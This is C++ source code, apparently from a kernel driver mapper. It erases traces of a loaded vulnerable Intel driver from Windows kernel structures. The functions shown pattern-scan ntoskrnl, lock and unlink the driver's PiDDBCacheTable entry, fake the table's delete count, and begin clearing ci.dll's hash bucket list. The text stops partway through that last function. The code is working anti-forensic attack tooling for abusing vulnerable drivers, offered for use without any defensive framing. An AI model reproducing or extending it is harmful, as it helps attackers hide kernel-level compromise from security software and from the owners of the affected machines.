#include "Clean.h"
#include "VulnerableDriverLoader.h"
#include <memory>
#include <vector>

namespace
{
	constexpr ULONG IntelDriverTimestamp = 0x5284EAC3;

	struct PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[ 16 ];
	};

	struct HashBucketEntry
	{
		HashBucketEntry* Next;
		UNICODE_STRING	DriverName;
		ULONG			CertHash[ 5 ];
	};

	struct RtlBalancedLinks
	{
		RtlBalancedLinks* Parent;
		RtlBalancedLinks* LeftChild;
		RtlBalancedLinks* RightChild;
		char			 Balance;
		uint8_t		 Reserved[ 3 ];
	};

	struct RtlAvlTable
	{
		RtlBalancedLinks BalancedRoot;
		void*			OrderedPointer;
		ULONG			WhichOrderedElement;
		ULONG			NumberGenericTableElements;
		ULONG			DepthOfTree;
		void*			RestartKey;
		ULONG			DeleteCount;
		void*			CompareRoutine;
		void*			AllocateRoutine;
		void*			FreeRoutine;
		void*			TableContext;
	};

	uint64_t GetKernelModuleAddressByName( const char* moduleName )
	{
		if ( !moduleName )
			return 0;

		auto miSpace = r_cast<PRTL_PROCESS_MODULES>( GetSysInfo( SystemModuleInformation ) );

		if ( !miSpace )
			return 0;

		uint64_t result = 0;

		for ( ULONG i = 0; i < miSpace->NumberOfModules; i++ )
		{
			const char* fullName = r_cast<const char*>( miSpace->Modules[ i ].FullPathName );
			const char* currentName = fullName + miSpace->Modules[ i ].OffsetToFileName;

			if ( !_stricmp( currentName, moduleName ) )
			{
				result = r_cast<uint64_t>( miSpace->Modules[ i ].ImageBase );
				break;
			}
		}

		RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, miSpace );

		return result;
	}

	std::wstring GetVulnerableDriverNameW( )
	{
		wchar_t name[ 64 ] {};
		if ( !BuildMapperDriverPathW( name, _countof( name ) ) )
			return L"";

		std::wstring path( name );
		const auto pos = path.find_last_of( L'\\' );

		if ( pos != std::wstring::npos )
			path = path.substr( pos + 1 );

		return path;
	}
}

class KernelCleanImpl
{
public:
	static bool ExAcquireResourceExclusiveLite( KernelRwCallBackend& backend, PVOID Resource, BOOLEAN wait )
	{
		if ( !Resource )
			return false;

		static uint64_t kernelExAcquireResourceExclusiveLite = 0;

		if ( !kernelExAcquireResourceExclusiveLite )
			kernelExAcquireResourceExclusiveLite = backend.GetKernelModuleExport( backend.m_Ntoskrnl, pstra( "ExAcquireResourceExclusiveLite" ) );

		if ( !kernelExAcquireResourceExclusiveLite )
		{
			LOG_SEC( "[-] - [Clean] Failed to resolve ExAcquireResourceExclusiveLite" );
			return false;
		}

		BOOLEAN out = FALSE;

		if ( !backend.CallKernelFunction( &out, kernelExAcquireResourceExclusiveLite, Resource, wait ) )
			return false;

		return out != FALSE;
	}

	static bool ExReleaseResourceLite( KernelRwCallBackend& backend, PVOID Resource )
	{
		if ( !Resource )
			return false;

		static uint64_t kernelExReleaseResourceLite = 0;

		if ( !kernelExReleaseResourceLite )
			kernelExReleaseResourceLite = backend.GetKernelModuleExport( backend.m_Ntoskrnl, pstra( "ExReleaseResourceLite" ) );

		if ( !kernelExReleaseResourceLite )
		{
			LOG_SEC( "[-] - [Clean] Failed to resolve ExReleaseResourceLite" );
			return false;
		}

		return backend.CallKernelFunction<void>( nullptr, kernelExReleaseResourceLite, Resource );
	}

	static BOOLEAN RtlDeleteElementGenericTableAvl( KernelRwCallBackend& backend, PVOID Table, PVOID Buffer )
	{
		if ( !Table )
			return FALSE;

		static uint64_t kernelRtlDeleteElementGenericTableAvl = 0;

		if ( !kernelRtlDeleteElementGenericTableAvl )
			kernelRtlDeleteElementGenericTableAvl = backend.GetKernelModuleExport( backend.m_Ntoskrnl, pstra( "RtlDeleteElementGenericTableAvl" ) );

		if ( !kernelRtlDeleteElementGenericTableAvl )
		{
			LOG_SEC( "[-] - [Clean] Failed to resolve RtlDeleteElementGenericTableAvl" );
			return FALSE;
		}

		BOOLEAN out = FALSE;
		return backend.CallKernelFunction( &out, kernelRtlDeleteElementGenericTableAvl, Table, Buffer ) ? out : FALSE;
	}

	static PVOID RtlLookupElementGenericTableAvl( KernelRwCallBackend& backend, PRTL_AVL_TABLE Table, PVOID Buffer )
	{
		if ( !Table )
			return nullptr;

		static uint64_t kernelRtlLookupElementGenericTableAvl = 0;

		if ( !kernelRtlLookupElementGenericTableAvl )
			kernelRtlLookupElementGenericTableAvl = backend.GetKernelModuleExport( backend.m_Ntoskrnl, pstra( "RtlLookupElementGenericTableAvl" ) );

		if ( !kernelRtlLookupElementGenericTableAvl )
		{
			LOG_SEC( "[-] - [Clean] Failed to resolve RtlLookupElementGenericTableAvl" );
			return nullptr;
		}

		PVOID out = nullptr;

		if ( !backend.CallKernelFunction( &out, kernelRtlLookupElementGenericTableAvl, Table, Buffer ) )
		{
			LOG_SEC( "[-] - [Clean] Failed to call RtlLookupElementGenericTableAvl" );
			return nullptr;
		}

		return out;
	}

	static PiDDBCacheEntry* LookupEntry( KernelRwCallBackend& backend, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name )
	{
		PiDDBCacheEntry localEntry {};
		localEntry.TimeDateStamp = timestamp;
		localEntry.DriverName.Buffer = const_cast<PWSTR>( name );
		localEntry.DriverName.Length = static_cast<USHORT>( wcslen( name ) * 2 );
		localEntry.DriverName.MaximumLength = localEntry.DriverName.Length + 2;

		return r_cast<PiDDBCacheEntry*>( RtlLookupElementGenericTableAvl( backend, PiDDBCacheTable, &localEntry ) );
	}

	static bool ReadMemory( KernelRwCallBackend& backend, uint64_t address, void* buffer, size_t size )
	{
		return backend.ReadMemory( address, buffer, size );
	}

	static bool WriteMemory( KernelRwCallBackend& backend, uint64_t address, const void* buffer, size_t size )
	{
		return backend.WriteMemory( address, buffer, size );
	}
};

std::uint32_t KernelClean::ClearPiDDBCacheTable( KernelRwCallBackend& backend )
{
	if ( !backend.m_Ntoskrnl )
		return 1;


	auto PiDDBLockPtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x" ); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	auto PiDDBCacheTablePtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x66\x03\xD2\x48\x8D\x0D", "xxxxxx" ); // 66 03 D2 48 8D 0D

	if ( PiDDBLockPtr == NULL ) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as possible
		PiDDBLockPtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x" ); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if ( PiDDBLockPtr == NULL ) {
			PiDDBLockPtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x" ); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 48 8D 0D ? ? ? ? B2 01 66 FF 88 ? ? ? ? 90 E8 ? ? ? ? 4C 8B ? 24 update for build 26100.1000
			if ( PiDDBLockPtr == NULL ) {
				LOG_SEC( "[-] - [Clean] PiDDBLock not found" );
				return 2;
			}
			else {
				LOG_SEC( "[-] - [Clean] PiDDBLock found with third pattern" );
				PiDDBLockPtr += 19;//third pattern offset
			}
		}
		else {
			LOG_SEC( "[-] - [Clean] PiDDBLock found with second pattern" );
			PiDDBLockPtr += 16; //second pattern offset
		}
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	PRTL_AVL_TABLE PiDDBCacheTable = {};

	if ( PiDDBCacheTablePtr == NULL ) {
		//48 8D 0D ? ? ? ? 45 33 F6 48 89 44 24
		PiDDBCacheTablePtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24", "xxx????xxxxxxx" );

		if ( PiDDBCacheTablePtr ) {
			LOG_SEC( "[+] - [Clean] PiDDBCacheTable found with first pattern" );
			PiDDBCacheTable = r_cast<PRTL_AVL_TABLE>( backend.ResolveRelativeAddress( PiDDBCacheTablePtr, 3, 7 ) );
		}
	}

	if ( !PiDDBCacheTablePtr )
	{
		LOG_SEC( "[-] - [Clean] PiDDBCacheTable not found" );
		return 3;
	}

	if ( !PiDDBCacheTable )
	{
		PiDDBCacheTable = r_cast<PRTL_AVL_TABLE>( backend.ResolveRelativeAddress( PiDDBCacheTablePtr, 6, 10 ) );
	}

	LOG_SEC( "[+] - [Clean] PiDDBLock Ptr 0x%llX", (ULONG64)PiDDBLockPtr );
	LOG_SEC( "[+] - [Clean] PiDDBCacheTable Ptr 0x%llX", (ULONG64)PiDDBCacheTablePtr );

	PVOID PiDDBLock = r_cast<PVOID>( backend.ResolveRelativeAddress( PiDDBLockPtr, 3, 7 ) );

	if ( !PiDDBLock || !PiDDBCacheTable )
	{
		LOG_SEC( "[-] - [Clean] Failed to resolve PiDDB pointers" );
		return 4;
	}

	LOG_SEC( "[+] - [Clean] PiDDBLock 0x%llx PiDDBCacheTable 0x%llx", r_cast<uint64_t>( PiDDBLock ), r_cast<uint64_t>( PiDDBCacheTable ) );

	if ( !KernelCleanImpl::ExAcquireResourceExclusiveLite( backend, PiDDBLock, TRUE ) )
	{
		LOG_SEC( "[-] - [Clean] Can't lock PiDDBCacheTable" );
		return 5;
	}

	const auto driverName = GetVulnerableDriverNameW( );

	LOG_SEC( "[+] - [Clean] Looking for PiDDB entry %ls", driverName.c_str( ) );

	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
	auto pFoundEntry = KernelCleanImpl::LookupEntry( backend, PiDDBCacheTable, iqvw64e_timestamp, driverName.c_str( ) );

	if ( !pFoundEntry )
	{
		LOG_SEC( "[-] - [Clean] Entry not found in PiDDBCacheTable" );
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 6;
	}

	PLIST_ENTRY prev = nullptr;
	if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( pFoundEntry ) + offsetof( PiDDBCacheEntry, List.Blink ), &prev, sizeof( prev ) ) )
	{
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 7;
	}

	PLIST_ENTRY next = nullptr;
	if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( pFoundEntry ) + offsetof( PiDDBCacheEntry, List.Flink ), &next, sizeof( next ) ) )
	{
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 8;
	}

	LOG_SEC( "[+] - [Clean] PiDDB entry found 0x%llx", r_cast<uint64_t>( pFoundEntry ) );

	if ( !KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( prev ) + offsetof( LIST_ENTRY, Flink ), &next, sizeof( next ) ) )
	{
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 9;
	}

	if ( !KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( next ) + offsetof( LIST_ENTRY, Blink ), &prev, sizeof( prev ) ) )
	{
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 10;
	}

	if ( !KernelCleanImpl::RtlDeleteElementGenericTableAvl( backend, PiDDBCacheTable, pFoundEntry ) )
	{
		LOG_SEC( "[-] - [Clean] Can't delete from PiDDBCacheTable" );
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 11;
	}

	ULONG cacheDeleteCount = 0;
	KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( PiDDBCacheTable ) + offsetof( RTL_AVL_TABLE, DeleteCount ), &cacheDeleteCount, sizeof( ULONG ) );

	if ( cacheDeleteCount > 0 )
	{
		cacheDeleteCount--;
		KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( PiDDBCacheTable ) + offsetof( RTL_AVL_TABLE, DeleteCount ), &cacheDeleteCount, sizeof( ULONG ) );
	}

	KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );

	LOG_SEC( "[+] - [Clean] PiDDBCacheTable cleaned" );
	return 0;
}

std::uint32_t KernelClean::ClearPiDDBCacheTableManual( KernelRwCallBackend& backend )
{
	if ( !backend.m_Ntoskrnl )
		return 1;

	auto PiDDBLockPtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x" );
	auto PiDDBCacheTablePtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x66\x03\xD2\x48\x8D\x0D", "xxxxxx" );

	if ( PiDDBLockPtr == NULL ) {
		PiDDBLockPtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x" );
		if ( PiDDBLockPtr == NULL ) {
			PiDDBLockPtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x" );
			if ( PiDDBLockPtr == NULL ) {
				LOG_SEC( "[-] - [Clean] PiDDBLock not found" );
				return 2;
			}
			else {
				PiDDBLockPtr += 19;
			}
		}
		else {
			PiDDBLockPtr += 16;
		}
	}
	else {
		PiDDBLockPtr += 28;
	}

	uint64_t PiDDBCacheTable = 0;

	if ( PiDDBCacheTablePtr == NULL ) {
		PiDDBCacheTablePtr = backend.FindPatternInSection( pstra( "PAGE" ), backend.m_Ntoskrnl, "\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24", "xxx????xxxxxxx" );

		if ( PiDDBCacheTablePtr ) {
			PiDDBCacheTable = backend.ResolveRelativeAddress( PiDDBCacheTablePtr, 3, 7 );
		}
	}

	if ( !PiDDBCacheTablePtr )
	{
		LOG_SEC( "[-] - [Clean] PiDDBCacheTable not found" );
		return 3;
	}

	if ( !PiDDBCacheTable )
	{
		PiDDBCacheTable = backend.ResolveRelativeAddress( PiDDBCacheTablePtr, 6, 10 );
	}

	PVOID PiDDBLock = r_cast<PVOID>( backend.ResolveRelativeAddress( PiDDBLockPtr, 3, 7 ) );

	if ( !PiDDBLock || !PiDDBCacheTable )
	{
		LOG_SEC( "[-] - [Clean] Failed to resolve PiDDB pointers" );
		return 4;
	}

	LOG_SEC( "[+] - [Clean] PiDDBLock 0x%llx PiDDBCacheTable 0x%llx", r_cast<uint64_t>( PiDDBLock ), PiDDBCacheTable );

	if ( !KernelCleanImpl::ExAcquireResourceExclusiveLite( backend, PiDDBLock, TRUE ) )
	{
		LOG_SEC( "[-] - [Clean] Can't lock PiDDBCacheTable" );
		return 5;
	}

	const auto driverName = GetVulnerableDriverNameW( );

	LOG_SEC( "[+] - [Clean] (manual) Looking for PiDDB entry %ls", driverName.c_str( ) );

	constexpr ULONG iqvw64e_timestamp = 0x5284EAC3;

	RtlAvlTable table {};
	if ( !KernelCleanImpl::ReadMemory( backend, PiDDBCacheTable, &table, sizeof( table ) ) )
	{
		LOG_SEC( "[-] - [Clean] (manual) Failed to read RTL_AVL_TABLE" );
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 6;
	}

	LOG_SEC( "[+] - [Clean] (manual) AVL elements=%u depth=%u", table.NumberGenericTableElements, table.DepthOfTree );

	const uint64_t balancedRootAddr = PiDDBCacheTable + offsetof( RtlAvlTable, BalancedRoot );
	RtlBalancedLinks balancedRoot {};
	if ( !KernelCleanImpl::ReadMemory( backend, balancedRootAddr, &balancedRoot, sizeof( balancedRoot ) ) )
	{
		LOG_SEC( "[-] - [Clean] (manual) Failed to read BalancedRoot" );
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 7;
	}

	LOG_SEC( "[*] - [Clean] (manual) BalancedRoot Parent=0x%llx Left=0x%llx Right=0x%llx Balance=%d",
		r_cast<uint64_t>( balancedRoot.Parent ), r_cast<uint64_t>( balancedRoot.LeftChild ),
		r_cast<uint64_t>( balancedRoot.RightChild ), balancedRoot.Balance );

	// RTL_AVL_TABLE's BalancedRoot is a synthetic sentinel node. The real root of the
	// tree is stored in BalancedRoot.Parent (Microsoft reuses this field as "Root" link).
	uint64_t rootChild = r_cast<uint64_t>( balancedRoot.Parent );

	if ( !rootChild )
	{
		LOG_SEC( "[-] - [Clean] (manual) AVL tree empty (no root via BalancedRoot.Parent)" );
		KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
		return 7;
	}

	LOG_SEC( "[+] - [Clean] (manual) Root node = 0x%llx", rootChild );

	// Iterative in-order traversal using an explicit stack.
	// BalancedRoot is a synthetic sentinel; its LeftChild points to the real root node.
	// We use a sentinel bit (high bit of the address) to mark "left subtree already pushed".
	constexpr uint64_t kVisitedLeftFlag = 0x8000000000000000ULL;

	auto MarkVisitedLeft = [ ]( uint64_t v ) -> uint64_t { return v | kVisitedLeftFlag; };
	auto StripFlag = [ ]( uint64_t v ) -> uint64_t { return v & ~kVisitedLeftFlag; };
	auto HasVisitedLeft = [ ]( uint64_t v ) -> bool { return ( v & kVisitedLeftFlag ) != 0; };

	std::vector<uint64_t> stack;
	stack.push_back( rootChild );

	size_t visited = 0;

	while ( !stack.empty( ) && visited < 8192 )
	{
		uint64_t item = stack.back( );
		stack.pop_back( );

		LOG_SEC( "[*] - [Clean] (manual) Stack pop item=0x%llx (visitedLeft=%d) stackSize=%zu visited=%zu",
			item, HasVisitedLeft( item ) ? 1 : 0, stack.size( ), visited );

		if ( HasVisitedLeft( item ) )
		{
			// Visit this node now.
			const uint64_t node = StripFlag( item );
			++visited;

			LOG_SEC( "[*] - [Clean] (manual) Visiting node 0x%llx (entry at 0x%llx)", node, node + sizeof( RtlBalancedLinks ) );

			RtlBalancedLinks links {};
			if ( !KernelCleanImpl::ReadMemory( backend, node, &links, sizeof( links ) ) )
			{
				LOG_SEC( "[-] - [Clean] (manual) Failed to read RtlBalancedLinks at node 0x%llx", node );
				continue;
			}

			LOG_SEC( "[*] - [Clean] (manual) Node 0x%llx Parent=0x%llx Left=0x%llx Right=0x%llx Balance=%d",
				node, r_cast<uint64_t>( links.Parent ), r_cast<uint64_t>( links.LeftChild ),
				r_cast<uint64_t>( links.RightChild ), links.Balance );

			const uint64_t entryAddr = node + sizeof( RtlBalancedLinks );

			PiDDBCacheEntry entry {};
			if ( !KernelCleanImpl::ReadMemory( backend, entryAddr, &entry, sizeof( entry ) ) )
			{
				LOG_SEC( "[-] - [Clean] (manual) Failed to read PiDDBCacheEntry at 0x%llx", entryAddr );
				continue;
			}

			LOG_SEC( "[*] - [Clean] (manual) Entry 0x%llx TimeDateStamp=0x%X LoadStatus=0x%X DriverName.Length=%u DriverName.Buffer=0x%llx",
				entryAddr, entry.TimeDateStamp, entry.LoadStatus, entry.DriverName.Length, r_cast<uint64_t>( entry.DriverName.Buffer ) );

			if ( !entry.DriverName.Length || !entry.DriverName.Buffer )
			{
				LOG_SEC( "[!] - [Clean] (manual) Entry 0x%llx has empty DriverName (Length=%u Buffer=0x%llx), skipping",
					entryAddr, entry.DriverName.Length, r_cast<uint64_t>( entry.DriverName.Buffer ) );

				if ( links.RightChild )
				{
					LOG_SEC( "[*] - [Clean] (manual) Descending right child 0x%llx", r_cast<uint64_t>( links.RightChild ) );
					stack.push_back( r_cast<uint64_t>( links.RightChild ) );
				}
				continue;
			}

			const auto nameLen = entry.DriverName.Length;
			auto wsName = std::make_unique<wchar_t[ ]>( s_cast<size_t>( nameLen ) / 2 + 1 );

			if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( entry.DriverName.Buffer ), wsName.get( ), nameLen ) )
			{
				LOG_SEC( "[-] - [Clean] (manual) Failed to read DriverName.Buffer at 0x%llx length=%u",
					r_cast<uint64_t>( entry.DriverName.Buffer ), nameLen );

				if ( links.RightChild )
				{
					LOG_SEC( "[*] - [Clean] (manual) Descending right child 0x%llx", r_cast<uint64_t>( links.RightChild ) );
					stack.push_back( r_cast<uint64_t>( links.RightChild ) );
				}
				continue;
			}

			wsName[ nameLen / 2 ] = L'\0';

			LOG_SEC( "[+] - [Clean] (manual) Node 0x%llx entry=0x%llx TimeDateStamp=0x%X Name=%ws",
				node, entryAddr, entry.TimeDateStamp, wsName.get( ) );

			if ( entry.TimeDateStamp != iqvw64e_timestamp )
			{
				LOG_SEC( "[*] - [Clean] (manual) Timestamp mismatch (got 0x%X expected 0x%X), skipping",
					entry.TimeDateStamp, iqvw64e_timestamp );
			}
			else if ( driverName != wsName.get( ) )
			{
				LOG_SEC( "[*] - [Clean] (manual) Name mismatch (got %ws expected %ws), skipping",
					wsName.get( ), driverName.c_str( ) );
			}
			else
			{
				LOG_SEC( "[+] - [Clean] (manual) Found Table Entry = 0x%llx (MATCH)", entryAddr );

				PLIST_ENTRY prevList = nullptr;
				if ( !KernelCleanImpl::ReadMemory( backend, entryAddr + offsetof( PiDDBCacheEntry, List.Blink ), &prevList, sizeof( prevList ) ) )
				{
					LOG_SEC( "[-] - [Clean] (manual) Failed to read List.Blink at 0x%llx", entryAddr + offsetof( PiDDBCacheEntry, List.Blink ) );
					KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
					return 8;
				}

				LOG_SEC( "[*] - [Clean] (manual) Entry List.Blink (prev) = 0x%llx", r_cast<uint64_t>( prevList ) );

				PLIST_ENTRY nextList = nullptr;
				if ( !KernelCleanImpl::ReadMemory( backend, entryAddr + offsetof( PiDDBCacheEntry, List.Flink ), &nextList, sizeof( nextList ) ) )
				{
					LOG_SEC( "[-] - [Clean] (manual) Failed to read List.Flink at 0x%llx", entryAddr + offsetof( PiDDBCacheEntry, List.Flink ) );
					KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
					return 9;
				}

				LOG_SEC( "[*] - [Clean] (manual) Entry List.Flink (next) = 0x%llx", r_cast<uint64_t>( nextList ) );

				if ( !KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( prevList ) + offsetof( LIST_ENTRY, Flink ), &nextList, sizeof( nextList ) ) )
				{
					LOG_SEC( "[-] - [Clean] (manual) Failed to write prev->Flink at 0x%llx", r_cast<uint64_t>( prevList ) + offsetof( LIST_ENTRY, Flink ) );
					KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
					return 10;
				}

				LOG_SEC( "[*] - [Clean] (manual) prev->Flink updated to 0x%llx", r_cast<uint64_t>( nextList ) );

				if ( !KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( nextList ) + offsetof( LIST_ENTRY, Blink ), &prevList, sizeof( prevList ) ) )
				{
					LOG_SEC( "[-] - [Clean] (manual) Failed to write next->Blink at 0x%llx", r_cast<uint64_t>( nextList ) + offsetof( LIST_ENTRY, Blink ) );
					KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );
					return 11;
				}

				LOG_SEC( "[*] - [Clean] (manual) next->Blink updated to 0x%llx", r_cast<uint64_t>( prevList ) );

				ULONG cacheDeleteCount = 0;
				if ( !KernelCleanImpl::ReadMemory( backend, PiDDBCacheTable + offsetof( RtlAvlTable, DeleteCount ), &cacheDeleteCount, sizeof( ULONG ) ) )
				{
					LOG_SEC( "[-] - [Clean] (manual) Failed to read DeleteCount at 0x%llx", PiDDBCacheTable + offsetof( RtlAvlTable, DeleteCount ) );
				}
				else
				{
					LOG_SEC( "[*] - [Clean] (manual) Current DeleteCount = %u", cacheDeleteCount );

					if ( cacheDeleteCount > 0 )
					{
						cacheDeleteCount--;

						if ( !KernelCleanImpl::WriteMemory( backend, PiDDBCacheTable + offsetof( RtlAvlTable, DeleteCount ), &cacheDeleteCount, sizeof( ULONG ) ) )
							LOG_SEC( "[-] - [Clean] (manual) Failed to write new DeleteCount %u", cacheDeleteCount );
						else
							LOG_SEC( "[*] - [Clean] (manual) DeleteCount decremented to %u", cacheDeleteCount );
					}
					else
					{
						LOG_SEC( "[!] - [Clean] (manual) DeleteCount already 0, not decrementing" );
					}
				}

				KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );

				LOG_SEC( "[+] - [Clean] PiDDBCacheTable cleaned (manual)" );
				return 0;
			}

			// After visiting, descend right subtree.
			if ( links.RightChild )
			{
				LOG_SEC( "[*] - [Clean] (manual) Descending right child 0x%llx", r_cast<uint64_t>( links.RightChild ) );
				stack.push_back( r_cast<uint64_t>( links.RightChild ) );
			}
			else
			{
				LOG_SEC( "[*] - [Clean] (manual) No right child, going up" );
			}
		}
		else
		{
			// First time we see this node: re-push as "visited-left", then push left child.
			const uint64_t node = item;

			LOG_SEC( "[*] - [Clean] (manual) First visit to node 0x%llx, pushing back as visited-left", node );

			RtlBalancedLinks links {};
			if ( !KernelCleanImpl::ReadMemory( backend, node, &links, sizeof( links ) ) )
			{
				LOG_SEC( "[-] - [Clean] (manual) Failed to read RtlBalancedLinks at node 0x%llx (first visit)", node );
				continue;
			}

			LOG_SEC( "[*] - [Clean] (manual) Node 0x%llx (first) Parent=0x%llx Left=0x%llx Right=0x%llx Balance=%d",
				node, r_cast<uint64_t>( links.Parent ), r_cast<uint64_t>( links.LeftChild ),
				r_cast<uint64_t>( links.RightChild ), links.Balance );

			stack.push_back( MarkVisitedLeft( node ) );

			if ( links.LeftChild )
			{
				LOG_SEC( "[*] - [Clean] (manual) Pushing left child 0x%llx", r_cast<uint64_t>( links.LeftChild ) );
				stack.push_back( r_cast<uint64_t>( links.LeftChild ) );
			}
			else
			{
				LOG_SEC( "[*] - [Clean] (manual) No left child, will visit node 0x%llx next", node );
			}
		}
	}

	KernelCleanImpl::ExReleaseResourceLite( backend, PiDDBLock );

	LOG_SEC( "[-] - [Clean] (manual) Entry not found in PiDDBCacheTable (visited %zu nodes)", visited );
	return 12;
}

std::uint32_t KernelClean::ClearKernelHashBucketList( KernelRwCallBackend& backend )
{
	const auto ci = GetKernelModuleAddressByName( pstra( "ci.dll" ) );

	if ( !ci )
	{
		LOG_SEC( "[-] - [Clean] Can't find ci.dll" );
		return 1;
	}

	auto sig = backend.FindPatternInSection( pstra( "PAGE" ), ci,
		"\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00", pstra( "xxx????x?xxxxxxx" ) );

	if ( !sig )
	{
		LOG_SEC( "[-] - [Clean] Can't find g_KernelHashBucketList" );
		return 2;
	}

	auto sig2 = backend.FindPattern( sig - 50, 50, "\x48\x8D\x0D", pstra( "xxx" ) );

	if ( !sig2 )
	{
		LOG_SEC( "[-] - [Clean] Can't find g_HashCacheLock" );
		return 3;
	}

	const auto g_KernelHashBucketList = r_cast<PVOID>( backend.ResolveRelativeAddress( sig, 3, 7 ) );
	const auto g_HashCacheLock = r_cast<PVOID>( backend.ResolveRelativeAddress( sig2, 3, 7 ) );

	if ( !g_KernelHashBucketList || !g_HashCacheLock )
	{
		LOG_SEC( "[-] - [Clean] Can't resolve g_HashCache relative addresses" );
		return 4;
	}

	LOG_SEC( "[+] - [Clean] g_KernelHashBucketList 0x%llx", r_cast<uint64_t>( g_KernelHashBucketList ) );

	bool locked = false;

	for ( size_t i = 0; i < 100; i++ )
	{
		if ( !KernelCleanImpl::ExAcquireResourceExclusiveLite( backend, g_HashCacheLock, TRUE ) )
		{
			Sleep( 1 );
			continue;
		}

		locked = true;
		break;
	}

	if ( !locked )
		LOG_SEC( "[-] - [Clean] Can't lock g_HashCacheLock" );

	auto prev = r_cast<HashBucketEntry*>( g_KernelHashBucketList );
	HashBucketEntry* entry = nullptr;

	if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( prev ), &entry, sizeof( entry ) ) )
	{
		KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
		return 6;
	}

	if ( !entry )
	{
		LOG_SEC( "[!] - [Clean] g_KernelHashBucketList empty" );
		KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
		return 7;
	}

